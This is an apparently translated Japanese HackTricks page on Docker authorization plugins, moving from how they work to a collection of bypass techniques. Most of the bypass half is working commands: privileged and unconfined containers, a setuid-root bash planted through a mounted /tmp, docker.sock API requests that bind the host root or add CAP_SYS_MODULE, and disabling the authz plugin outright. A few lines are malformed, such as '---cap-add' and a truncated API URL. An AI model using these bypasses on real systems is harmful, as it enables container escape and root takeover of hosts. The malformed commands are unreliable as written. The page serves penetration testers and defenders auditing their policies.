<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告掲載したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有する。

</details>


**Docker**の標準の**認可**モデルは**全てか無か**です。Dockerデーモンへのアクセス権を持つユーザーは、**任意の**Dockerクライアント**コマンド**を**実行**できます。DockerのEngine APIを使用してデーモンに連絡する呼び出し元にも同じことが当てはまります。**より高度なアクセス制御**が必要な場合は、**認可プラグイン**を作成し、Dockerデーモンの設定に追加することができます。認可プラグインを使用すると、Docker管理者はDockerデーモンへのアクセスを管理するための**詳細なアクセスポリシー**を設定できます。

# 基本アーキテクチャ

Docker認可プラグインは、Dockerデーモンに対して要求された**アクション**を**許可/拒否**するために使用できる**外部**の**プラグイン**です。これは、要求した**ユーザー**と要求された**アクション**に**応じて**変わります。

CLI経由またはEngine APIを介してDocker**デーモン**に対して**HTTP** **リクエスト**が行われると、**認証**サブシステムがリクエストをインストールされた**認証** **プラグイン**に**渡します**。リクエストにはユーザー（呼び出し元）とコマンドコンテキストが含まれています。**プラグイン**はリクエストを**許可**するか**拒否**するかを決定する責任があります。

以下のシーケンス図は、許可と拒否の認可フローを示しています：

![Authorization Allow flow](https://docs.docker.com/engine/extend/images/authz_allow.png)

![Authorization Deny flow](https://docs.docker.com/engine/extend/images/authz_deny.png)

プラグインに送信される各リクエストには、認証されたユーザー、HTTPヘッダー、およびリクエスト/レスポンスボディが**含まれています**。**ユーザー名**と使用された**認証方法**のみがプラグインに渡されます。最も重要なことは、ユーザーの**資格情報**やトークンは渡され**ない**ということです。最後に、**すべてのリクエスト/レスポンスボディが認可プラグインに送信されるわけではありません**。`Content-Type`が`text/*`または`application/json`の場合にのみ、リクエスト/レスポンスボディが送信されます。

HTTP接続をハイジャックする可能性があるコマンド（`HTTP Upgrade`）については、`exec`のようなコマンドでは、認可プラグインは初期のHTTPリクエストに対してのみ呼び出されます。プラグインがコマンドを承認すると、残りのフローに対しては認可が適用されません。具体的には、ストリーミングデータは認可プラグインに渡されません。`logs`や`events`のようにチャンク化されたHTTPレスポンスを返すコマンドについては、HTTPリクエストのみが認可プラグインに送信されます。

リクエスト/レスポンスの処理中に、一部の認可フローではDockerデーモンに対して追加のクエリを実行する必要があるかもしれません。このようなフローを完了するために、プラグインは通常のユーザーと同様にデーモンAPIを呼び出すことができます。これらの追加のクエリを有効にするために、プラグインは管理者が適切な認証およびセキュリティポリシーを設定する手段を提供する必要があります。

## 複数のプラグイン

Dockerデーモンの**起動**の一部として**プラグイン**を**登録**する責任があります。**複数のプラグインをインストールし、それらを連鎖させる**ことができます。このチェーンは順序付けられることがあります。デーモンへの各リクエストは、順番にチェーンを通過します。**すべてのプラグインがリソースへのアクセスを許可した場合にのみ**、アクセスが許可されます。

# プラグインの例

## Twistlock AuthZ Broker

プラグイン[**authz**](https://github.com/twistlock/authz)を使用すると、**プラグイン**がリクエストを認可するために**読み取る**簡単な**JSON**ファイルを作成できます。したがって、どのAPIエンドポイントが各ユーザーに到達できるかを非常に簡単に制御する機会を提供します。

これは、AliceとBobが新しいコンテナを作成できる例です：`{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`

ページ[route_parser.go](https://github.com/twistlock/authz/blob/master/core/route_parser.go)では、要求されたURLとアクションの関係を見つけることができます。ページ[types.go](https://github.com/twistlock/authz/blob/master/core/types.go)では、アクション名とアクションの関係を見つけることができます。

## シンプルなプラグインチュートリアル

インストールとデバッグに関する詳細情報を含む、**理解しやすいプラグイン**をこちらで見つけることができます：[**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)

`README`と`plugin.go`のコードを読んで、それがどのように機能しているかを理解してください。

# Docker認可プラグインのバイパス

## アクセスの列挙

チェックする主なことは、**どのエンドポイントが許可されているか**と**HostConfigのどの値が許可されているか**です。

この列挙を実行するには、ツール[**https://github.com/carlospolop/docker_auth_profiler**](https://github.com/carlospolop/docker_auth_profiler)**を使用できます。**

## 許可されていない`run --privileged`

### 最小限の権限
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
### コンテナを実行してから特権セッションを取得する

このケースでは、システム管理者は**ボリュームをマウントしたり、コンテナに `--privileged` フラグを使って実行したり、コンテナに追加の権限を与えることを禁止しました**：
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
しかし、ユーザーは**実行中のコンテナ内にシェルを作成し、それに追加の権限を与えることができます**：
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```
ユーザーは、[**以前に議論した技術**](./#privileged-flag)を使用してコンテナから脱出し、ホスト内で**権限を昇格**することができます。

## 書き込み可能なフォルダのマウント

このケースでは、sysadminはユーザーがコンテナに `--privileged` フラグを使用することや、コンテナに追加の機能を与えることを**禁止**し、`/tmp` フォルダのマウントのみを許可しました：
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
{% hint style="info" %}
`/tmp` フォルダをマウントできない場合がありますが、**異なる書き込み可能なフォルダ**をマウントすることができます。書き込み可能なディレクトリを見つけるには、次のコマンドを使用します: `find / -writable -type d 2>/dev/null`

**Linuxマシンのすべてのディレクトリがsuidビットをサポートしているわけではないことに注意してください！** suidビットをサポートしているディレクトリを確認するには、`mount | grep -v "nosuid"` を実行します。例えば通常、`/dev/shm`、`/run`、`/proc`、`/sys/fs/cgroup`、`/var/lib/lxcfs` はsuidビットをサポートしていません。

また、`/etc` やその他の**設定ファイルを含むフォルダ**を**マウントできる**場合、dockerコンテナからrootとしてそれらを変更し、**ホストで悪用して権限を昇格させる**ことができます（例えば `/etc/shadow` を変更することによって）。
{% endhint %}

## チェックされていないAPIエンドポイント

このプラグインを設定するsysadminの責任は、各ユーザーがどのアクションをどの権限で実行できるかを制御することです。したがって、管理者がエンドポイントと属性に対して**ブラックリスト**アプローチを取る場合、攻撃者が**権限を昇格させる**ことを可能にする**いくつかのものを忘れる**かもしれません。

docker APIについては[https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)で確認できます。

## チェックされていないJSON構造

### ルートでのバインド

sysadminがdockerファイアウォールを設定した際に、[**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)の重要なパラメーターの一つである"**Binds**"を**忘れてしまった**可能性があります。\
以下の例では、この設定ミスを悪用して、ホストのルート(/)フォルダをマウントするコンテナを作成し実行することが可能です：
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
{% hint style="warning" %}
この例では、JSONのルートレベルキーとして**`Binds`**パラメータを使用していますが、APIでは**`HostConfig`**キーの下に表示されることに注意してください。
{% endhint %}

### HostConfig内のBinds

**ルート内のBinds**と同じ手順に従い、Docker APIに対してこの**リクエスト**を実行します：
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```
### ルート内のマウント

**Binds in root** と同じ手順に従い、Docker APIに対してこの**リクエスト**を実行します：
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```
### HostConfigのマウント

**Binds in root** と同じ手順に従い、Docker APIに対してこの**リクエスト**を実行します：
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```
## チェックされていないJSON属性

sysadminがdockerファイアウォールを設定した際に、[**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)のパラメーターの重要な属性を**忘れてしまった**可能性があります。例えば、"**HostConfig**"内の"**Capabilities**"がそれにあたります。以下の例では、この設定ミスを悪用して、**SYS\_MODULE**機能を持つコンテナを作成し実行することが可能です：
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
{% hint style="info" %}
**`HostConfig`** は、コンテナからの脱出に通常含まれる**興味深い** **権限**を持っているキーです。しかし、以前に議論したように、それ以外にBindsを使用することも機能し、制限を回避する可能性があることに注意してください。
{% endhint %}

## プラグインの無効化

もし**システム管理者**がプラグインを**無効にする**機能を**禁止する**のを**忘れていた**場合、それを利用して完全に無効にすることができます！
```bash
docker plugin list #Enumerate plugins

# If you don’t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```
権限昇格後は、**プラグインを再度有効にすることを忘れないでください**。さもなければ、**Dockerサービスの再起動が機能しません**！

## Authプラグインバイパスの書き込み

* [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)

# 参考文献

* [https://docs.docker.com/engine/extend/plugins\_authorization/](https://docs.docker.com/engine/extend/plugins\_authorization/)


<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
